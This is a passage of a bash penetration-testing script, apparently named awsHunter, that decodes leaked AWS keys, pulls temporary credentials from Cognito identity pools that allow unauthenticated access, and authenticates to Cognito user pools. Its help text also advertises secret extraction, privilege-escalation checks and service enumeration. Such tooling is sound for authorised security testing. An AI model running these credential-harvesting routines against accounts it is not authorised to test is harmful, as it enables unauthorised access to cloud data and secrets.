#!/bin/bash

#===============================================================================
# AWS Lambda/Cognito Security Testing Script
# 
# This script tests for common AWS misconfigurations including:
# - Cognito Identity Pool unauthenticated access
# - Credential enumeration from leaked keys
# - Service access enumeration
#
# Usage: ./awsHunter.sh [options]
#
# Author: Sedric Louissaint @l0lsec aka ShowUpShowOut
#===============================================================================

# Don't use set -e as many AWS commands legitimately return non-zero
# set -e

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Output file for results (will be created after parsing args)
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
OUTPUT_DIR="./awsHunter_results_${TIMESTAMP}"

#===============================================================================
# Helper Functions
#===============================================================================

print_banner() {
    echo -e "${PURPLE}"
    cat << 'EOF'
                                                                              
     ██████╗ ██╗    ██╗███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗ 
    ██╔════╝ ██║    ██║██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    ███████╗ ██║ █╗ ██║███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    ██╔═══██╗██║███╗██║╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
    ╚██████╔╝╚███╔███╔╝███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
     ╚═════╝  ╚══╝╚══╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
                                                                              
EOF
    echo -e "${CYAN}"
    cat << 'EOF'
                        ╭──────────────────────────────────────╮
                        │  ☁️  AWS Security Testing Framework  │
                        │  🔍 Multi-Region Cred & Svc Enum     │
                        │  👤 @l0lsec aka ShowUpShowOut        │
                        ╰──────────────────────────────────────╯
EOF
    echo -e "${YELLOW}"
    cat << 'EOF'
          ⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀
          ⠀⠀⠀⠀⠀⠀⣾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷    "Hunt credentials.
          ⠀⠀⠀⠀⠀⠀⣿⠀⠀🎯⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿     Enumerate access.
          ⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿     Extract secrets."
          ⠀⠀⠀⠀⠀⠀⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛
EOF
    echo -e "${NC}"
}

print_section() {
    echo -e "\n${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_success() {
    echo -e "${GREEN}[✓] $1${NC}"
}

print_error() {
    echo -e "${RED}[✗] $1${NC}"
}

print_warning() {
    echo -e "${YELLOW}[!] $1${NC}"
}

print_info() {
    echo -e "${BLUE}[i] $1${NC}"
}

print_finding() {
    echo -e "${RED}[🚨 FINDING] $1${NC}"
}

test_service() {
    local service_name="$1"
    local command="$2"
    local output_file="$3"
    
    echo -n "Testing $service_name... "
    
    if result=$(eval "$command" 2>&1); then
        echo "$result" > "$OUTPUT_DIR/$output_file"
        print_success "ACCESS GRANTED - Results saved to $output_file"
        return 0
    else
        if echo "$result" | grep -q "AccessDenied\|UnauthorizedOperation\|AccessDeniedException\|AuthorizationError"; then
            print_error "Access Denied"
            return 1
        else
            print_warning "Error: $result"
            return 2
        fi
    fi
}

# Test a service across all regions
test_service_all_regions() {
    local service_name="$1"
    local command_template="$2"  # Use {REGION} as placeholder
    local output_file_base="$3"
    local found_access=false
    local regions_with_access=()
    
    if [ "$MULTI_REGION" != true ]; then
        # Single region mode - just test the default region
        local command="${command_template//\{REGION\}/$AWS_REGION}"
        test_service "$service_name" "$command" "$output_file_base"
        return $?
    fi
    
    echo -n "Testing $service_name across all regions... "
    
    for region in "${ALL_REGIONS[@]}"; do
        local command="${command_template//\{REGION\}/$region}"
        local output_file="${output_file_base%.json}_${region}.json"
        [ "${output_file_base: -4}" != ".json" ] && output_file="${output_file_base}_${region}.txt"
        
        if result=$(eval "$command" 2>&1); then
            # Check if result has actual content (not empty arrays/objects)
            if [ -n "$result" ] && ! echo "$result" | grep -qE '^\s*\[\s*\]\s*$|^\s*\{\s*\}\s*$|"[A-Za-z]*":\s*\[\]'; then
                echo "$result" > "$OUTPUT_DIR/$output_file"
                regions_with_access+=("$region")
                found_access=true
            fi
        fi
    done
    
    if [ "$found_access" = true ]; then
        print_success "ACCESS GRANTED in ${#regions_with_access[@]} regions: ${regions_with_access[*]}"
        return 0
    else
        print_error "Access Denied (all regions)"
        return 1
    fi
}

# Get all available AWS regions
get_all_regions() {
    print_info "Fetching list of all AWS regions..."
    
    ALL_REGIONS=($(aws ec2 describe-regions --query 'Regions[].RegionName' --output text 2>/dev/null))
    
    if [ ${#ALL_REGIONS[@]} -eq 0 ]; then
        print_warning "Could not fetch regions, using default list"
        ALL_REGIONS=(
            "us-east-1" "us-east-2" "us-west-1" "us-west-2"
            "eu-west-1" "eu-west-2" "eu-west-3" "eu-central-1" "eu-north-1"
            "ap-southeast-1" "ap-southeast-2" "ap-northeast-1" "ap-northeast-2" "ap-northeast-3" "ap-south-1"
            "sa-east-1"
            "ca-central-1"
            "me-south-1"
            "af-south-1"
        )
    fi
    
    print_success "Found ${#ALL_REGIONS[@]} regions to test"
    echo "${ALL_REGIONS[*]}" > "$OUTPUT_DIR/regions_tested.txt"
}

#===============================================================================
# Usage & Help
#===============================================================================

show_help() {
    cat << EOF
AWS Security Testing Script
===========================

Usage: $0 [OPTIONS]

Options:
    -h, --help              Show this help message
    -r, --region REGION     AWS region (default: us-east-1)
    -p, --pool-id ID        Cognito Identity Pool ID to test
    -e, --encoded CREDS     Base64 encoded credentials string to decode
    -a, --access-key KEY    AWS Access Key ID
    -s, --secret-key KEY    AWS Secret Access Key
    -t, --session-token TOK AWS Session Token (for temporary credentials)
    -o, --output DIR        Output directory (default: ./awsHunter_results_TIMESTAMP)
    -q, --quick             Quick mode - skip some slower tests
    -v, --verbose           Verbose output
    -m, --multi-region      Test all AWS regions (slower but comprehensive)
    --regions REGIONS       Comma-separated list of regions to test (e.g., us-east-1,us-west-2)
    --skip-cognito          Skip Cognito Identity Pool testing
    --skip-privesc          Skip privilege escalation checks
    --skip-secrets          Skip secret extraction (faster)
    --test-create           Enable destructive tests (attempt to create resources)
                            WARNING: This will create test resources in the target account

Cognito User Pool Client Auth:
    --client-id ID          Cognito App Client ID
    --client-secret SECRET  Cognito App Client Secret
    --token-url URL         OAuth2 token endpoint URL
                            (e.g., https://mydomain.auth.us-east-2.amazoncognito.com/oauth2/token)
    --username USER         Cognito username (for USER_PASSWORD_AUTH flow)
    --password PASS         Cognito password (for USER_PASSWORD_AUTH flow)
    --user-pool-id ID       Cognito User Pool ID (e.g., us-east-1_AbCdEfG)
                            Required for --username/--password flow.
                            Optional for --token-url client_credentials flow.

Service Selection:
    --service SERVICES      Comma-separated list of services to test (e.g., s3,lambda,dynamodb)
    --service-category CAT  Test all services in specified categories (e.g., database,secrets)
    --list-services         Show all available services and categories

Examples:
    # Test with environment variables
    export AWS_ACCESS_KEY_ID="AKIAXXXXXXXXX"
    export AWS_SECRET_ACCESS_KEY="secretkey"
    $0

    # Test specific Cognito Identity Pool
    $0 -p us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

    # Test with direct credentials
    $0 -a AKIAXXXXXXXXX -s secretkey -r us-west-2

    # Decode credentials from Lambda response
    $0 -e "PT1RYU1KVGJZUlVWRWhFYUpSa1N3..."

    # Quick test (skip slow operations)
    $0 --quick

    # Test only S3 and Lambda
    $0 --service s3,lambda

    # Test only database services
    $0 --service-category database

    # Test database and secrets services
    $0 --service-category database,secrets

    # List all available services
    $0 --list-services

    # Get Bearer token with Cognito client credentials (no IAM keys needed)
    $0 --client-id ABC123 --client-secret SECRETXYZ \\
       --token-url https://mydomain.auth.us-east-2.amazoncognito.com/oauth2/token

    # Client credentials + probe a specific API Gateway
    API_BASE_URL=https://xxxxx.execute-api.us-east-2.amazonaws.com \\
    $0 --client-id ABC123 --client-secret SECRETXYZ \\
       --token-url https://mydomain.auth.us-east-2.amazoncognito.com/oauth2/token

    # User Pool auth with username/password (exchanges for IAM creds)
    $0 --client-id ABC123 --client-secret SECRETXYZ \\
       --username user@example.com --password 'P@ssw0rd!' \\
       --user-pool-id us-east-1_AbCdEfG -p us-east-1:xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx

Environment Variables:
    AWS_ACCESS_KEY_ID       AWS Access Key ID
    AWS_SECRET_ACCESS_KEY   AWS Secret Access Key
    AWS_SESSION_TOKEN       AWS Session Token (optional)
    AWS_REGION              AWS Region
    COGNITO_IDENTITY_POOL_ID  Cognito Identity Pool ID
    ENCODED_CREDENTIALS     Encoded credentials to decode

Output:
    Results are saved to ./awsHunter_results_TIMESTAMP/
    - security_report.md    Full security assessment report
    - ALL_SECRETS_FOUND.txt Consolidated list of discovered secrets
    - *.json                Raw API responses
    - *_secrets.txt         Extracted secrets per service

EOF
    exit 0
}

#===============================================================================
# Parse Command Line Arguments
#===============================================================================

QUICK_MODE=false
VERBOSE=false
SKIP_COGNITO=false
SKIP_PRIVESC=false
SKIP_SECRETS=false
CUSTOM_OUTPUT_DIR=""
MULTI_REGION=false
CUSTOM_REGIONS=""
ALL_REGIONS=()
TEST_DESTRUCTIVE=false
SELECTED_SERVICES=""
SELECTED_CATEGORIES=""

# Services to test (space-separated string, used as a simple lookup)
SERVICES_TO_TEST=""

#===============================================================================
# Available Services Definition
#===============================================================================

# Service category definitions (using simple strings for compatibility)
CATEGORY_GLOBAL="s3 iam-users iam-roles route53 cloudfront organizations"
CATEGORY_COMPUTE="lambda ec2 ecs eks elasticbeanstalk lightsail batch emr sagemaker"
CATEGORY_DATABASE="dynamodb rds elasticache redshift documentdb neptune"
CATEGORY_STORAGE="efs fsx backup"
CATEGORY_SECRETS="secretsmanager ssm kms"
CATEGORY_MESSAGING="sqs sns kinesis firehose eventbridge mq"
CATEGORY_CONTAINERS="ecr"
CATEGORY_SERVERLESS="apigateway appsync amplify stepfunctions"
CATEGORY_DATA="glue athena"
CATEGORY_DEVTOOLS="codecommit codebuild codepipeline"
CATEGORY_IOT="iot transfer"
CATEGORY_SECURITY="guardduty securityhub inspector macie config cloudtrail ram wafv2"
CATEGORY_NETWORK="vpc security-groups subnets vpc-endpoints network-acls nat-gateways internet-gateways vpn directconnect elb target-groups"
CATEGORY_EMAIL="ses"
CATEGORY_LOGS="cloudwatch-logs"
CATEGORY_OTHER="cognito-pools cloudformation acm opensearch cost-explorer budgets"

# All categories list
ALL_CATEGORIES="global compute database storage secrets messaging containers serverless data devtools iot security network email logs other"

# Flat list of all services
ALL_SERVICES="s3 iam-users iam-roles route53 cloudfront organizations lambda ec2 ecs eks elasticbeanstalk lightsail batch emr sagemaker dynamodb rds elasticache redshift documentdb neptune efs fsx backup secretsmanager ssm kms sqs sns kinesis firehose eventbridge mq ecr apigateway appsync amplify stepfunctions glue athena codecommit codebuild codepipeline iot transfer guardduty securityhub inspector macie config cloudtrail ram wafv2 vpc security-groups subnets vpc-endpoints network-acls nat-gateways internet-gateways vpn directconnect elb target-groups ses cloudwatch-logs cognito-pools cloudformation acm opensearch cost-explorer budgets"

# Function to get services for a category
get_category_services() {
    local category="$1"
    case "$category" in
        global) echo "$CATEGORY_GLOBAL" ;;
        compute) echo "$CATEGORY_COMPUTE" ;;
        database) echo "$CATEGORY_DATABASE" ;;
        storage) echo "$CATEGORY_STORAGE" ;;
        secrets) echo "$CATEGORY_SECRETS" ;;
        messaging) echo "$CATEGORY_MESSAGING" ;;
        containers) echo "$CATEGORY_CONTAINERS" ;;
        serverless) echo "$CATEGORY_SERVERLESS" ;;
        data) echo "$CATEGORY_DATA" ;;
        devtools) echo "$CATEGORY_DEVTOOLS" ;;
        iot) echo "$CATEGORY_IOT" ;;
        security) echo "$CATEGORY_SECURITY" ;;
        network) echo "$CATEGORY_NETWORK" ;;
        email) echo "$CATEGORY_EMAIL" ;;
        logs) echo "$CATEGORY_LOGS" ;;
        other) echo "$CATEGORY_OTHER" ;;
        *) echo "" ;;
    esac
}

# Function to list all available services
list_services() {
    echo -e "${CYAN}Available Services for Testing${NC}"
    echo -e "${CYAN}===============================${NC}"
    echo ""
    
    echo -e "${YELLOW}[global]${NC}"
    for service in $CATEGORY_GLOBAL; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[compute]${NC}"
    for service in $CATEGORY_COMPUTE; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[database]${NC}"
    for service in $CATEGORY_DATABASE; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[storage]${NC}"
    for service in $CATEGORY_STORAGE; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[secrets]${NC}"
    for service in $CATEGORY_SECRETS; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[messaging]${NC}"
    for service in $CATEGORY_MESSAGING; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[containers]${NC}"
    for service in $CATEGORY_CONTAINERS; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[serverless]${NC}"
    for service in $CATEGORY_SERVERLESS; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[data]${NC}"
    for service in $CATEGORY_DATA; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[devtools]${NC}"
    for service in $CATEGORY_DEVTOOLS; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[iot]${NC}"
    for service in $CATEGORY_IOT; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[security]${NC}"
    for service in $CATEGORY_SECURITY; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[network]${NC}"
    for service in $CATEGORY_NETWORK; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[email]${NC}"
    for service in $CATEGORY_EMAIL; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[logs]${NC}"
    for service in $CATEGORY_LOGS; do echo "  - $service"; done
    echo ""
    
    echo -e "${YELLOW}[other]${NC}"
    for service in $CATEGORY_OTHER; do echo "  - $service"; done
    echo ""
    
    echo -e "${CYAN}Usage Examples:${NC}"
    echo "  # Test single service"
    echo "  $0 --service s3"
    echo ""
    echo "  # Test multiple services"
    echo "  $0 --service s3,lambda,dynamodb"
    echo ""
    echo "  # Test all services in a category"
    echo "  $0 --service-category global"
    echo "  $0 --service-category database,secrets"
    echo ""
    echo "  # Test all services (default behavior)"
    echo "  $0"
    
    exit 0
}

# Function to check if a service should be tested
should_test_service() {
    local service="$1"
    
    # If no specific services selected, test all
    if [ -z "$SERVICES_TO_TEST" ]; then
        return 0
    fi
    
    # Check if this service is in the selected list (with word boundaries)
    if echo " $SERVICES_TO_TEST " | grep -q " $service "; then
        return 0
    fi
    
    return 1
}

# Function to parse service selection
parse_service_selection() {
    local services_input="$1"
    local valid_count=0
    
    # Clear existing selections
    SERVICES_TO_TEST=""
    
    # Parse comma-separated list
    IFS=',' read -ra services_array <<< "$services_input"
    for service in "${services_array[@]}"; do
        # Trim whitespace
        service=$(echo "$service" | xargs)
        
        # Validate service exists
        if echo " $ALL_SERVICES " | grep -q " $service "; then
            SERVICES_TO_TEST="$SERVICES_TO_TEST $service"
            ((valid_count++))
        else
            print_warning "Unknown service: $service (skipping)"
        fi
    done
    
    # Trim leading/trailing spaces
    SERVICES_TO_TEST=$(echo "$SERVICES_TO_TEST" | xargs)
    
    if [ -z "$SERVICES_TO_TEST" ]; then
        print_error "No valid services specified!"
        echo "Use --list-services to see available services"
        exit 1
    fi
    
    print_info "Testing $valid_count selected services: $SERVICES_TO_TEST"
}

# Function to parse category selection
parse_category_selection() {
    local categories_input="$1"
    local valid_count=0
    
    # Clear existing selections
    SERVICES_TO_TEST=""
    
    # Parse comma-separated list
    IFS=',' read -ra categories_array <<< "$categories_input"
    for category in "${categories_array[@]}"; do
        # Trim whitespace
        category=$(echo "$category" | xargs)
        
        # Get services for this category
        local cat_services=$(get_category_services "$category")
        
        if [ -n "$cat_services" ]; then
            SERVICES_TO_TEST="$SERVICES_TO_TEST $cat_services"
        else
            print_warning "Unknown category: $category (skipping)"
        fi
    done
    
    # Trim and count unique services
    SERVICES_TO_TEST=$(echo "$SERVICES_TO_TEST" | xargs)
    valid_count=$(echo "$SERVICES_TO_TEST" | wc -w | xargs)
    
    if [ -z "$SERVICES_TO_TEST" ]; then
        print_error "No valid categories specified!"
        echo "Available categories: $ALL_CATEGORIES"
        exit 1
    fi
    
    print_info "Testing $valid_count services from selected categories"
}

while [[ $# -gt 0 ]]; do
    case $1 in
        -h|--help)
            show_help
            ;;
        -r|--region)
            AWS_REGION="$2"
            shift 2
            ;;
        -p|--pool-id)
            COGNITO_IDENTITY_POOL_ID="$2"
            shift 2
            ;;
        -e|--encoded)
            ENCODED_CREDENTIALS="$2"
            shift 2
            ;;
        -a|--access-key)
            DIRECT_ACCESS_KEY="$2"
            shift 2
            ;;
        -s|--secret-key)
            DIRECT_SECRET_KEY="$2"
            shift 2
            ;;
        -t|--session-token)
            DIRECT_SESSION_TOKEN="$2"
            shift 2
            ;;
        -o|--output)
            CUSTOM_OUTPUT_DIR="$2"
            shift 2
            ;;
        -q|--quick)
            QUICK_MODE=true
            shift
            ;;
        -v|--verbose)
            VERBOSE=true
            shift
            ;;
        -m|--multi-region)
            MULTI_REGION=true
            shift
            ;;
        --regions)
            CUSTOM_REGIONS="$2"
            MULTI_REGION=true
            shift 2
            ;;
        --skip-cognito)
            SKIP_COGNITO=true
            shift
            ;;
        --skip-privesc)
            SKIP_PRIVESC=true
            shift
            ;;
        --skip-secrets)
            SKIP_SECRETS=true
            shift
            ;;
        --test-create)
            TEST_DESTRUCTIVE=true
            shift
            ;;
        --service)
            SELECTED_SERVICES="$2"
            shift 2
            ;;
        --service-category)
            SELECTED_CATEGORIES="$2"
            shift 2
            ;;
        --client-id)
            COGNITO_CLIENT_ID="$2"
            shift 2
            ;;
        --client-secret)
            COGNITO_CLIENT_SECRET="$2"
            shift 2
            ;;
        --username)
            COGNITO_USERNAME="$2"
            shift 2
            ;;
        --password)
            COGNITO_PASSWORD="$2"
            shift 2
            ;;
        --user-pool-id)
            COGNITO_USER_POOL_ID="$2"
            shift 2
            ;;
        --token-url)
            COGNITO_TOKEN_URL="$2"
            shift 2
            ;;
        --list-services)
            list_services
            ;;
        *)
            print_error "Unknown option: $1"
            echo "Use -h or --help for usage information"
            exit 1
            ;;
    esac
done

# Validate Cognito client auth flag combinations
if [ -n "$COGNITO_CLIENT_ID" ]; then
    if [ -z "$COGNITO_CLIENT_SECRET" ]; then
        print_error "--client-id requires --client-secret"
        exit 1
    fi
    if [ -n "$COGNITO_USERNAME" ] && [ -z "$COGNITO_PASSWORD" ]; then
        print_error "--username requires --password"
        exit 1
    fi
    if [ -z "$COGNITO_USERNAME" ] && [ -n "$COGNITO_PASSWORD" ]; then
        print_error "--password requires --username"
        exit 1
    fi
    # USER_PASSWORD_AUTH needs a User Pool ID to build the provider string
    if [ -n "$COGNITO_USERNAME" ] && [ -z "$COGNITO_USER_POOL_ID" ]; then
        print_error "--username/--password flow requires --user-pool-id"
        exit 1
    fi
    # client_credentials flow without --token-url needs --user-pool-id for domain discovery
    if [ -z "$COGNITO_USERNAME" ] && [ -z "$COGNITO_TOKEN_URL" ] && [ -z "$COGNITO_USER_POOL_ID" ]; then
        print_error "Provide --token-url or --user-pool-id so the OAuth2 endpoint can be determined"
        exit 1
    fi
fi

# Parse service selection if specified
if [ -n "$SELECTED_SERVICES" ]; then
    parse_service_selection "$SELECTED_SERVICES"
elif [ -n "$SELECTED_CATEGORIES" ]; then
    parse_category_selection "$SELECTED_CATEGORIES"
fi

#===============================================================================
# Configuration
#===============================================================================

# Cognito Identity Pool to test (can be passed as argument or set here)
COGNITO_IDENTITY_POOL_ID="${COGNITO_IDENTITY_POOL_ID:-}"
AWS_REGION="${AWS_REGION:-us-east-1}"

# Encoded credentials string (from Lambda response - for decoding test)
ENCODED_CREDENTIALS="${ENCODED_CREDENTIALS:-}"

# Direct credentials (if already known)
DIRECT_ACCESS_KEY="${DIRECT_ACCESS_KEY:-${AWS_ACCESS_KEY_ID:-}}"
DIRECT_SECRET_KEY="${DIRECT_SECRET_KEY:-${AWS_SECRET_ACCESS_KEY:-}}"
DIRECT_SESSION_TOKEN="${DIRECT_SESSION_TOKEN:-${AWS_SESSION_TOKEN:-}}"

# Set custom output directory if specified
if [ -n "$CUSTOM_OUTPUT_DIR" ]; then
    OUTPUT_DIR="$CUSTOM_OUTPUT_DIR"
fi

#===============================================================================
# Main Testing Functions
#===============================================================================

decode_credentials() {
    print_section "DECODING CREDENTIALS"
    
    if [ -n "$ENCODED_CREDENTIALS" ]; then
        print_info "Attempting to decode encoded credentials string..."
        
        # Try base64 decode + reverse + base64 decode
        decoded=$(echo "$ENCODED_CREDENTIALS" | base64 -d 2>/dev/null | rev 2>/dev/null)
        
        if [ -n "$decoded" ]; then
            # Try to decode the reversed string
            final_decoded=$(echo "$decoded" | base64 -d 2>/dev/null)
            
            if [ -n "$final_decoded" ]; then
                print_finding "Successfully decoded credentials!"
                echo "$final_decoded"
                
                # Try to extract Access Key and Secret Key
                # Format: AKIAXXXXXXXXXXXXXXXXX/SecretKeyHere
                if [[ "$final_decoded" =~ ^(AKIA[A-Z0-9]{16})/(.+)$ ]]; then
                    DECODED_ACCESS_KEY="${BASH_REMATCH[1]}"
                    DECODED_SECRET_KEY="${BASH_REMATCH[2]}"
                    print_finding "Extracted Access Key: $DECODED_ACCESS_KEY"
                    print_finding "Extracted Secret Key: $DECODED_SECRET_KEY"
                    
                    echo "Access Key: $DECODED_ACCESS_KEY" >> "$OUTPUT_DIR/decoded_credentials.txt"
                    echo "Secret Key: $DECODED_SECRET_KEY" >> "$OUTPUT_DIR/decoded_credentials.txt"
                fi
            fi
        fi
    fi
}

test_cognito_unauth_access() {
    print_section "TESTING COGNITO IDENTITY POOL UNAUTHENTICATED ACCESS"
    
    print_info "Identity Pool ID: $COGNITO_IDENTITY_POOL_ID"
    print_info "Region: $AWS_REGION"
    
    # Step 1: Get an identity ID
    echo -n "Getting identity ID... "
    IDENTITY_RESULT=$(aws cognito-identity get-id \
        --identity-pool-id "$COGNITO_IDENTITY_POOL_ID" \
        --region "$AWS_REGION" 2>&1)
    
    if echo "$IDENTITY_RESULT" | grep -q "IdentityId"; then
        IDENTITY_ID=$(echo "$IDENTITY_RESULT" | jq -r '.IdentityId')
        print_success "Got Identity ID: $IDENTITY_ID"
        print_finding "Cognito Identity Pool allows UNAUTHENTICATED access!"
        
        echo "$IDENTITY_RESULT" > "$OUTPUT_DIR/cognito_identity.json"
        
        # Step 2: Get credentials for this identity
        echo -n "Getting credentials for identity... "
        CREDS_RESULT=$(aws cognito-identity get-credentials-for-identity \
            --identity-id "$IDENTITY_ID" \
            --region "$AWS_REGION" 2>&1)
        
        if echo "$CREDS_RESULT" | grep -q "Credentials"; then
            print_success "Got temporary credentials!"
            print_finding "Unauthenticated credentials obtained!"
            
            echo "$CREDS_RESULT" > "$OUTPUT_DIR/cognito_credentials.json"
            
            # Extract credentials
            COGNITO_ACCESS_KEY=$(echo "$CREDS_RESULT" | jq -r '.Credentials.AccessKeyId')
            COGNITO_SECRET_KEY=$(echo "$CREDS_RESULT" | jq -r '.Credentials.SecretKey')
            COGNITO_SESSION_TOKEN=$(echo "$CREDS_RESULT" | jq -r '.Credentials.SessionToken')
            COGNITO_EXPIRATION=$(echo "$CREDS_RESULT" | jq -r '.Credentials.Expiration')
            
            print_info "Access Key: $COGNITO_ACCESS_KEY"
            print_info "Expiration: $COGNITO_EXPIRATION"
            
            return 0
        else
            print_error "Failed to get credentials: $CREDS_RESULT"
            return 1
        fi
    else
        print_error "Failed to get identity: $IDENTITY_RESULT"
        return 1
    fi
}

test_cognito_client_auth() {
    print_section "COGNITO USER POOL CLIENT AUTHENTICATION"

    print_info "Client ID: $COGNITO_CLIENT_ID"
    print_info "User Pool ID: $COGNITO_USER_POOL_ID"
    [ -n "$COGNITO_USERNAME" ] && print_info "Username: $COGNITO_USERNAME"

    local id_token=""

    if [ -n "$COGNITO_USERNAME" ] && [ -n "$COGNITO_PASSWORD" ]; then
        # USER_PASSWORD_AUTH flow
        print_info "Attempting USER_PASSWORD_AUTH flow..."

        local auth_params="USERNAME=${COGNITO_USERNAME},PASSWORD=${COGNITO_PASSWORD}"

        if [ -n "$COGNITO_CLIENT_SECRET" ]; then
            local secret_hash
            secret_hash=$(printf '%s' "${COGNITO_USERNAME}${COGNITO_CLIENT_ID}" \
                | openssl dgst -sha256 -hmac "$COGNITO_CLIENT_SECRET" -binary \
                | base64)
            auth_params="${auth_params},SECRET_HASH=${secret_hash}"
        fi

        echo -n "Authenticating... "
        AUTH_RESULT=$(aws cognito-idp initiate-auth \
            --client-id "$COGNITO_CLIENT_ID" \
            --auth-flow USER_PASSWORD_AUTH \
            --auth-parameters "$auth_params" \
            --region "$AWS_REGION" 2>&1)

        if echo "$AUTH_RESULT" | grep -q "AuthenticationResult"; then
            print_success "Authentication successful!"
            print_finding "Cognito User Pool accepted credentials!"

            echo "$AUTH_RESULT" > "$OUTPUT_DIR/cognito_client_auth.json"

            id_token=$(echo "$AUTH_RESULT" | jq -r '.AuthenticationResult.IdToken')
            local access_token
            access_token=$(echo "$AUTH_RESULT" | jq -r '.AuthenticationResult.AccessToken')

            print_info "ID Token obtained (${#id_token} chars)"
            print_info "Access Token obtained (${#access_token} chars)"

            if echo "$AUTH_RESULT" | jq -e '.AuthenticationResult.NewDeviceMetadata' >/dev/null 2>&1; then
                print_warning "New device metadata returned - MFA may be configured"
            fi
        elif echo "$AUTH_RESULT" | grep -q "ChallengeName"; then
            local challenge
            challenge=$(echo "$AUTH_RESULT" | jq -r '.ChallengeName')
            print_warning "Auth challenge required: $challenge"
            print_info "Challenges like NEW_PASSWORD_REQUIRED, MFA_SETUP, SMS_MFA need interactive handling"
            echo "$AUTH_RESULT" > "$OUTPUT_DIR/cognito_auth_challenge.json"
            return 1
        else
            print_error "Authentication failed: $AUTH_RESULT"
            return 1
        fi
    else
        # Client credentials (OAuth2) flow — no username/password
        print_info "No username/password provided. Attempting client_credentials OAuth2 flow..."

        local domain_url=""

        if [ -n "$COGNITO_TOKEN_URL" ]; then
            domain_url="$COGNITO_TOKEN_URL"
        else
            local token_endpoint
            token_endpoint=$(aws cognito-idp describe-user-pool \
                --user-pool-id "$COGNITO_USER_POOL_ID" \
                --region "$AWS_REGION" \
                --query 'UserPool.Domain' --output text 2>&1)

            if [ -n "$token_endpoint" ] && [ "$token_endpoint" != "None" ]; then
                domain_url="https://${token_endpoint}.auth.${AWS_REGION}.amazoncognito.com/oauth2/token"
            else
                print_error "Could not determine User Pool domain for OAuth2 endpoint"
                print_info "Provide --token-url with the full OAuth2 token URL"
                print_info "  e.g., --token-url https://mydomain.auth.us-east-2.amazoncognito.com/oauth2/token"
                print_info "Or provide --username and --password for USER_PASSWORD_AUTH flow instead"
                return 1
            fi
        fi

        local basic_auth
        basic_auth=$(printf '%s:%s' "$COGNITO_CLIENT_ID" "$COGNITO_CLIENT_SECRET" | base64)

        print_info "Token endpoint: $domain_url"
        echo -n "Requesting client_credentials grant... "

        local token_result
        token_result=$(curl -s -X POST "$domain_url" \
            -H "Authorization: Basic ${basic_auth}" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "grant_type=client_credentials" 2>&1)

        if echo "$token_result" | jq -e '.access_token' >/dev/null 2>&1; then
            print_success "Client credentials grant successful!"
            OAUTH2_ACCESS_TOKEN=$(echo "$token_result" | jq -r '.access_token')
            OAUTH2_TOKEN_URL="$domain_url"
            print_info "Access Token obtained (${#OAUTH2_ACCESS_TOKEN} chars)"
            echo "$token_result" > "$OUTPUT_DIR/cognito_oauth2_token.json"

            local expires_in
            expires_in=$(echo "$token_result" | jq -r '.expires_in // empty')
            [ -n "$expires_in" ] && print_info "Token expires in: ${expires_in}s"

            print_info "Token type: client_credentials (Bearer)"
            print_warning "This token cannot be exchanged for IAM credentials (no IdToken)"
            print_info "Will probe APIs accessible with this Bearer token"
            return 0
        else
            print_error "Client credentials grant failed: $token_result"
            return 1
        fi
    fi

    # Exchange IdToken for AWS credentials via Identity Pool
    if [ -z "$COGNITO_IDENTITY_POOL_ID" ]; then
        print_warning "No Identity Pool ID (-p) provided"
        print_warning "Cannot exchange tokens for AWS credentials without an Identity Pool"
        print_info "IdToken saved — provide -p <identity-pool-id> to get AWS credentials"
        return 1
    fi

    local provider="cognito-idp.${AWS_REGION}.amazonaws.com/${COGNITO_USER_POOL_ID}"
    print_info "Exchanging IdToken via Identity Pool..."
    print_info "Provider: $provider"

